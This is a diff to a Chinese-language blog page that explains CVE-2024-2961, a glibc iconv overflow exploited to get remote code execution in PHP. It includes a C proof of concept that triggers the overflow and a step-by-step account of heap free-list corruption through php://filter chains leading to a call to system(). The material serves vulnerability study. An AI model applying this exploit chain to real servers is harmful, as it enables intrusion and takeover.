@@ -186,13 +186,152 @@
     
     <div class="content" v-pre>
         <p>CVE-2024-2961 Iconv 实现PHP引擎 RCE</p>
-<p>本地复现尝试</p>
+<p>需要被攻击系统glibc版本更新时间在2024&#x2F;4&#x2F;17之前</p>
+<p>php版本在7.0.0-8.3.7，且支持任何PHP任何应用程序，例如wordpress等</p>
+<p>基本不会造成程序崩溃</p>
+<p>需要支持data伪协议，filter伪协议，支持filter中zlib.inflate过滤器及这三个方法的任意文件读取权限</p>
+<p>有效载荷小于1000字节，优化空间很小</p>
+<p>不需要发送其他额外的参数</p>
+<p>PHP的每个标准<em>文件读取</em>接收器都受到影响：<code>file_get_contents()</code>、<code>file()</code>、<code>readfile()</code>、<code>fgets()</code>、<code>getimagesize()</code>、<code>SplFileObject-&gt;read()</code>等。文件写入也受到影响（<code>file_put_contents()</code>及其同类）</p>
 <p>原文：<a target="_blank" rel="noopener" href="https://www.ambionics.io/blog/iconv-cve-2024-2961-p1">https://www.ambionics.io/blog/iconv-cve-2024-2961-p1</a></p>
 <p>exp：<a target="_blank" rel="noopener" href="https://github.com/ambionics/cnext-exploits">https://github.com/ambionics/cnext-exploits</a></p>
 <span id="more"></span>
 
+<h1 id="转换为ISO-2022-CN-EXT时的越界写入"><a href="#转换为ISO-2022-CN-EXT时的越界写入" class="headerlink" title="转换为ISO-2022-CN-EXT时的越界写入"></a>转换为ISO-2022-CN-EXT时的越界写入</h1><p>好在将数据转换为ISO-2022-CN-EXT字符集时，<em>iconv</em>可能未能检查在写入之前输出缓冲区是否有足够的空间。</p>
+<p>ISO-2022-CN-EXT实际上是一组字符集：当它需要编码一个字符时，它将选择适当的字符集，并发出一个转义序列，以指示解码器需要切换到这样的字符集。</p>
+<pre><code class="c">// iconvdata/iso-2022-cn-ext.c
+
+/* See whether we have to emit an escape sequence.  */
+if (set != used)
+&#123;
+    /* First see whether we announced that we use this
+        character set.  */
+    if ((used &amp; SO_mask) != 0 &amp;&amp; (ann &amp; SO_ann) != (used &lt;&lt; 8)) // [1]
+    &#123;
+        const char *escseq;
+
+        if (outptr + 4 &gt; outend) // &lt;-------------------- 检查点
+        &#123;
+            result = __GCONV_FULL_OUTPUT;
+            break;
+        &#125;
+
+        assert(used &gt;= 1 &amp;&amp; used &lt;= 4);
+        escseq = &quot;)A\0\0)G)E&quot; + (used - 1) * 2;
+        *outptr++ = ESC;
+        *outptr++ = &#39;$&#39;;
+        *outptr++ = *escseq++;
+        *outptr++ = *escseq++;
+
+        ann = (ann &amp; ~SO_ann) | (used &lt;&lt; 8);
+    &#125;
+    else if ((used &amp; SS2_mask) != 0 &amp;&amp; (ann &amp; SS2_ann) != (used &lt;&lt; 8)) // [2]
+    &#123;
+        const char *escseq;
+
+        // &lt;-------------------- 无检查点
+
+        assert(used == CNS11643_2_set);
+        escseq = &quot;*H&quot;;
+        *outptr++ = ESC;
+        *outptr++ = &#39;$&#39;;
+        *outptr++ = *escseq++;
+        *outptr++ = *escseq++;
+
+        ann = (ann &amp; ~SS2_ann) | (used &lt;&lt; 8);
+    &#125;
+    else if ((used &amp; SS3_mask) != 0 &amp;&amp; (ann &amp; SS3_ann) != (used &lt;&lt; 8)) // [3]
+    &#123;
+        const char *escseq;
+
+        // &lt;-------------------- 无检查点
+
+        assert((used &gt;&gt; 5) &gt;= 3 &amp;&amp; (used &gt;&gt; 5) &lt;= 7);
+        escseq = &quot;+I+J+K+L+M&quot; + ((used &gt;&gt; 5) - 3) * 2;
+        *outptr++ = ESC;
+        *outptr++ = &#39;$&#39;;
+        *outptr++ = *escseq++;
+        *outptr++ = *escseq++;
+
+        ann = (ann &amp; ~SS3_ann) | (used &lt;&lt; 8);
+    &#125;
+&#125;
+</code></pre>
+<p>要触发这个漏洞，我们需要强迫<code>iconv()</code>在输出缓冲区结束前发出一个转义序列</p>
+<p>为此，我们可以使用如下一些字符：</p>
+<ul>
+<li><code>劄</code></li>
+<li><code>䂚</code></li>
+</ul>
+<p>结果会导致1到3字节的溢出：</p>
+<ul>
+<li><code>$*H</code> [<code>24 2A 48</code>]</li>
+<li><code>$+J</code> [<code>24 2B 4A</code>]</li>
+</ul>
+<p>poc测试：</p>
+<pre><code class="c">/*
+CVE-2024-2961 POC
+$ gcc -o poc ./poc.c &amp;&amp; ./poc
+Remaining bytes (should be &gt; 0): -1
+$
+*/
+#include &lt;iconv.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;ctype.h&gt;
+
+void hexdump(void *ptr, int buflen)
+&#123;
+    unsigned char *buf = (unsigned char *)ptr;
+    int i, j;
+    for (i = 0; i &lt; buflen; i += 16)
+    &#123;
+        printf(&quot;%06x: &quot;, i);
+        for (j = 0; j &lt; 16; j++)
+            if (i + j &lt; buflen)
+                printf(&quot;%02x &quot;, buf[i + j]);
+            else
+                printf(&quot;   &quot;);
+        printf(&quot; &quot;);
+        for (j = 0; j &lt; 16; j++)
+            if (i + j &lt; buflen)
+                printf(&quot;%c&quot;, isprint(buf[i + j]) ? buf[i + j] : &#39;.&#39;);
+        printf(&quot;\n&quot;);
+    &#125;
+&#125;
+
+void main()
+&#123;
+    iconv_t cd = iconv_open(&quot;ISO-2022-CN-EXT&quot;, &quot;UTF-8&quot;);
+    //初始化了一个iconv_t类型的转换描述符,用于从&quot;ISO-2022-CN-EXT&quot;编码转换到&quot;UTF-8&quot;编码
+
+    char input[0x10] = &quot;AAAAA劄&quot;;//定义一个大小为0x10(16字节)的输入字符数组
+    char output[0x10] = &#123;0&#125;;
+
+    char *pinput = input;
+    char *poutput = output;
+
+    size_t sinput = strlen(input);//计算输入字符串的长度,并将输出缓冲区的初始大小设置为与输入相同
+    size_t soutput = sinput;
+
+    iconv(cd, &amp;pinput, &amp;sinput, &amp;poutput, &amp;soutput);
+
+    printf(&quot;Remaining bytes (should be &gt; 0): %zd\n&quot;, soutput);
+
+    hexdump(output, 0x10);
+&#125;
+</code></pre>
+<pre><code>root@e599ad047e2b:/var/www/html# gcc -o poc ./poc.c &amp;&amp; ./poc
+Remaining bytes (should be &gt; 0): -1
+000000: 41 41 41 41 41 1b 24 2a 48 00 00 00 00 00 00 00  AAAAA.$*H.......
+
+root@e599ad047e2b:/var/www/html# gcc -o poc ./poc.c &amp;&amp; ./poc
+Remaining bytes (should be &gt; 0): -1
+000000: 41 41 41 41 41 1b 24 2b 4a 00 00 00 00 00 00 00  AAAAA.$+J.......
+</code></pre>
 <h1 id="PHP堆的工作基本原理"><a href="#PHP堆的工作基本原理" class="headerlink" title="PHP堆的工作基本原理"></a>PHP堆的工作基本原理</h1><p>在php中分配内存的时候，使用emalloc(N)，N是字节数，执行后得到一个至少可以储存N字节的内存块的指针；完成之后可以用efree(ptr)释放</p>
-<p>php的堆有一个2MB的区域组成，分为512页，每一页0x1000字节，每一页都有可能包含特定大小的块；块之间没有元数据</p>
+<p>php的堆由一个2MB的区域组成，分为512页，每一页0x1000字节，每一页都有可能包含特定大小的块；块之间没有元数据</p>
 <blockquote>
 <p>元数据metadata，是数据的数据；元数据是对数据的一个说明，是对数据及信息资源的描述性信息</p>
 </blockquote>
@@ -205,8 +344,113 @@
 <li>空闲列表作为一个单链表，每个未被分配的块在其前八个字节中存在着指向下一个空闲块的指针</li>
 <li>如果我们从#1溢出到#2中，就会改变这个指针，进而改变空闲列表</li>
 </ul>
-<h1 id="PHP过滤器机制"><a href="#PHP过滤器机制" class="headerlink" title="PHP过滤器机制"></a>PHP过滤器机制</h1>
+<p>但是<strong>PHP会为每个 HTTP 请求创建一个新的堆</strong>。这是使远程 PHP 利用变得困难的原因之一 </p>
+<h1 id="PHP过滤器机制（php-filter）"><a href="#PHP过滤器机制（php-filter）" class="headerlink" title="PHP过滤器机制（php:&#x2F;&#x2F;filter）"></a>PHP过滤器机制（php:&#x2F;&#x2F;filter）</h1><p>PHP首先会获取流（即读取资源）。它将流存储在一个buckets的集合中，这些是双向链表结构，每个结构都包含一个特定大小的缓冲区。以&#x2F;etc&#x2F;passwd为例，我们可能有三个buckets：第一个包含文件的前5个字节，第二个bucket包含接下来的30个字节，第三个bucket包含另外的1000个字节，它们链接在一起</p>
+<p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/ZEkT0Rn34yGcQt61ibLypqwrfvPbbmPBsEuX3iabh0CHADCqNCcib6anjxtRJKm7GxtTTe27sglQnjfPdBJ1SNDnA/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
+<ul>
+<li>为bucket分配一个大小相同的缓冲区，并执行转换，然后创建一个新的bucket，并指向这个缓冲区</li>
+<li>依次执行，构建出一个全新的buckets集合</li>
+</ul>
+<p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/ZEkT0Rn34yGcQt61ibLypqwrfvPbbmPBsXMQHuZIaa5SULicdF2WibGP7mEoZecVuOjmaVQxbt6Rsw97CODM8vickA/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
+<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>当你读取一个文件的时候，php只会创建一个buckets</p>
+<p>当你请求HTTP的时候，php会创建一个包含整个HTTP响应的bucket</p>
+<p>现在我们需要多个bucket，才能修改空闲列表并且利用它</p>
+<p>有一个过滤器：zlib.inflate，它可以把我们的流进行解压缩，然后分配一个8页的缓冲区（0x8000字节），并将我们的流进行填充，如果不够，则会新建一个8页的缓冲区，这样的话，我们就能获得尽可能多的bucket来操作了</p>
+<p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/ZEkT0Rn34yGcQt61ibLypqwrfvPbbmPBsDhwJmiaaCNRN9AWxqQpIEazPStvgKjkkIeCNbOE1omPpKMMjdiaSL6SA/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
+<p>但是0x8000的缓冲区还是太大了，并且这些在释放的时候不会进入空闲列表，也就是说，我们必须进行更进一步的操作</p>
+<p>利用dechunk过滤器进行去块操作：</p>
+<p>例如</p>
+<p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/ZEkT0Rn34yGcQt61ibLypqwrfvPbbmPBsDK9l5XtuK2pialPQiaskibmFXTIHv6YHNJ6RcoY1AtHN8kfZAd6sQTFiaQ/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
+<p>去块后的结果将是：This is how the chunked encoding works</p>
+<p>这样，我们根据这种格式传入数据，再使用dechunk操作，就可以完全控制每一个bucket的内容大小：</p>
+<p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/ZEkT0Rn34yGcQt61ibLypqwrfvPbbmPBszJxyKPxWtAagMRj3Uz0FsODpEFcYhLNGYhicndLqW5laQN4bWnQrJvQ/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
+<p>但是又但是，这样做会使得只有第一个bucket被解析，实际上，在操作过程中，在第一个0x148结束之后读取一个0x0，dechunk就停止了，</p>
+<p>对此，我们可以在数据前加入很多0来填充，例如：</p>
+<p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/ZEkT0Rn34yGcQt61ibLypqwrfvPbbmPBsdO2gTx4VzXBK4chQnkeiaic4eicHQibcN8F6T1oy3RuhruCjV2nd4uKNoQ/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
+<p>在前面加入无效的0，使得最后解析0x148之后正好在末尾结束，从而能够进入下一个bucket继续解析，直到解析完成</p>
+<h1 id="空闲列表控制"><a href="#空闲列表控制" class="headerlink" title="空闲列表控制"></a>空闲列表控制</h1><blockquote>
+<p>LSB(Least Significant Bit):</p>
+<ul>
+<li>LSB是二进制数中权重最小的位,即最右边的位。</li>
+<li>在一个二进制数中,LSB的值可以是0或1。</li>
+<li>LSB对整个数值的影响最小,改变LSB只会改变数值的最低位。</li>
+</ul>
+<p>MSB(Most Significant Bit):</p>
+<ul>
+<li>MSB是二进制数中权重最大的位,即最左边的位。</li>
+<li>在一个二进制数中,MSB的值可以是0或1。</li>
+<li>MSB对整个数值的影响最大,改变MSB会使数值发生重大变化。</li>
+<li>MSB通常用来表示数值的正负符号,0表示正数,1表示负数。</li>
+</ul>
+</blockquote>
+<p>我们的目标现在是通过用值48h（ASCII中的H）覆盖某些指针的LSB来改变一些空闲列表。为了无条件获得相同的效果，我们针对大小为0x100的chunks，因为chunks地址的LSB总是零。这意味着我们溢出的效果总是相同的：给chunk指针添加0x48</p>
+<p>我们将大小为0x100的chunks的空闲列表命名为<code>FL[0x100]</code></p>
+<p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/ZEkT0Rn34yGcQt61ibLypqwrfvPbbmPBs0Q49wKkicIZgSqibA1mZTeuKKlcibhUicQvvHOs2LpM6c1hGBVWmhlBq8g/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
+<p>假设我们已经通过分配许多<em>0x100</em> chunks来填充堆。因此，在内存中某处，我们有三个连续的空闲chunks <code>A</code>、<code>B</code>和<code>C</code>，其中<code>A</code>是<code>FL[100]</code>的头。<code>A</code>指向<code>B</code>，<code>B</code>指向<code>C</code>。我们可以分配这3个（步骤2），然后再次释放它们（步骤3）。此时，空闲列表被反转：我们有<code>C</code>→<code>B</code>→<code>A</code>。然后我们再次分配，但这次我们在<code>C</code>的<code>48h</code>偏移处放入一个任意指针<code>0x1122334455</code>（步骤4）。我们再次释放它们（步骤5），得到与步骤1完全相同的状态，但这次有一个小区别：在<code>C+48h</code>处，我们有一个任意指针。现在我们可以执行来自chunk <code>A</code>的溢出，这将改变<code>B</code>中包含的指针。现在它指向<code>C+48h</code>，结果空闲列表现在是<code>B</code>→<code>C+48h</code>→<code>0x1122334455</code>。通过另外3个分配，我们可以让我们的PHP在我们的任意地址上分配。</p>
+<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><p>但是让我回到漏洞利用的实现。在这里描述的各个步骤中，我们有被分配然后释放的chunks。但我们不能完全摆脱buckets：我们只能改变它们的大小。然而，我们只对<strong>大小为0x100的chunks感兴趣</strong>。就好像其他chunks不存在一样。因此，我构建了每个bucket作为一个<strong>HTTP-chunked套娃</strong>：</p>
+<p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/ZEkT0Rn34yGcQt61ibLypqwrfvPbbmPBsrIoo72arveBpaj1qLGnYkm49x2yyR8UBY6VGvDnzlo2EEjgo2sgnNA/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
+<p>在漏洞利用的每一步，都会调用<code>dechunk</code>过滤器：每个bucket的大小因此改变。一些的大小变为0x100，因此在利用中”出现”，一些变得更小，因此”消失”。这为我们提供了一个完美的方法，让buckets在特定时刻具体化，并在我们不再需要它们时将它们丢弃。</p>
+<h1 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h1><p>尽管我们通过读取<code>/proc/self/maps</code>看到内存区域，我们并不<em>精确地</em>知道我们在堆中的位置。幸运的是，我们可以通过定位PHP的堆完全忽略这个问题。由于其对齐方式（*~0x1fffff*）和大小（2MB），它很容易识别。在其顶部是一个<code>zend_mm_heap</code>结构，包含非常有用的字段：</p>
+<pre><code>struct _zend_mm_heap &#123;
+#if ZEND_MM_CUSTOM
+    int                use_custom_heap;
+#endif
+#if ZEND_MM_STORAGE
+    zend_mm_storage   *storage;
+#endif
+#if ZEND_MM_STAT
+    size_t             size;                    /* current memory usage */
+    size_t             peak;                    /* peak memory usage */
+#endif
+    zend_mm_free_slot *free_slot[ZEND_MM_BINS]; /* free lists for small sizes */
+#if ZEND_MM_STAT || ZEND_MM_LIMIT
+    size_t             real_size;               /* current size of allocated pages */
+#endif
+#if ZEND_MM_STAT
+    size_t             real_peak;               /* peak size of allocated pages */
+#endif
+#if ZEND_MM_LIMIT
+    size_t             limit;                   /* memory limit */
+    int                overflow;                /* memory overflow flag */
+#endif
+
+    zend_mm_huge_list *huge_list;               /* list of huge allocated blocks */
+
+    zend_mm_chunk     *main_chunk;
+    zend_mm_chunk     *cached_chunks;			/* list of unused chunks */
+    int                chunks_count;			/* number of allocated chunks */
+    int                peak_chunks_count;		/* peak number of allocated chunks for current request */
+    int                cached_chunks_count;		/* number of cached chunks */
+    double             avg_chunks_count;		/* average number of chunks allocated per request */
+    int                last_chunks_delete_boundary; /* number of chunks after last deletion */
+    int                last_chunks_delete_count;    /* number of deletion over the last boundary */
+#if ZEND_MM_CUSTOM
+    union &#123;
+        struct &#123;
+            void      *(*_malloc)(size_t);
+            void       (*_free)(void*);
+            void      *(*_realloc)(void*, size_t);
+        &#125; std;
+        struct &#123;
+            void      *(*_malloc)(size_t ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC);
+            void       (*_free)(void*  ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC);
+            void      *(*_realloc)(void*, size_t  ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC);
+        &#125; debug;
+    &#125; custom_heap;
+    HashTable *tracked_allocs;
+#endif
+&#125;;
+</code></pre>
+<p>首先，它保存了每个空闲列表。通过覆盖空闲列表，我们得到了任意数量的<em>写入什么-在哪里</em>，具有任意大小。我们可以使用这些来覆盖最后一个字段，<code>custom_heap</code>，它包含<code>emalloc()</code>、<code>efree()</code>和<code>erealloc()</code>的替代函数（类似于glibc中的<code>__malloc_hook</code>及其同类）。然后，我们把<code>use_custom_heap</code>设置为<code>1</code>，并在一个bucket上调用<code>free()</code>，给我们带来了一个带有控制参数的任意函数调用。由于我们可以使用文件读取访问二进制文件，我们可以构建花哨的ROP链，但我们想要尽可能通用的东西；因此，我将<code>custom_heap._free</code>设置为<code>system</code>，允许我们以CTF的方式运行任意的bash命令。</p>
+<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>逻辑步骤：下载<code>/proc/self/maps</code>，并提取PHP堆的地址和libc的文件名。然后，它下载libc二进制文件以提取<code>system()</code>的地址。最后，它执行一个最终请求来执行溢出并执行我们的任意命令</p>
+
     </div>
+    
+    <div id="toc">
+        <strong class="sidebar-title">目录</strong>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BD%AC%E6%8D%A2%E4%B8%BAISO-2022-CN-EXT%E6%97%B6%E7%9A%84%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5"><span class="toc-text">转换为ISO-2022-CN-EXT时的越界写入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP%E5%A0%86%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86"><span class="toc-text">PHP堆的工作基本原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP%E8%BF%87%E6%BB%A4%E5%99%A8%E6%9C%BA%E5%88%B6%EF%BC%88php-filter%EF%BC%89"><span class="toc-text">PHP过滤器机制（php:&#x2F;&#x2F;filter）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-text">利用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A9%BA%E9%97%B2%E5%88%97%E8%A1%A8%E6%8E%A7%E5%88%B6"><span class="toc-text">空闲列表控制</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%A1%A5%E5%85%85"><span class="toc-text">补充</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-text">代码执行</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%80%E5%90%8E"><span class="toc-text">最后</span></a></li></ol>
+    </div>
+
     
     
     
@@ -215,7 +459,7 @@
     
     
 </div>
-
+<script src="/js/toc.js"></script>
             <footer id="footer">
     <div id="footer-wrap">
         <div>
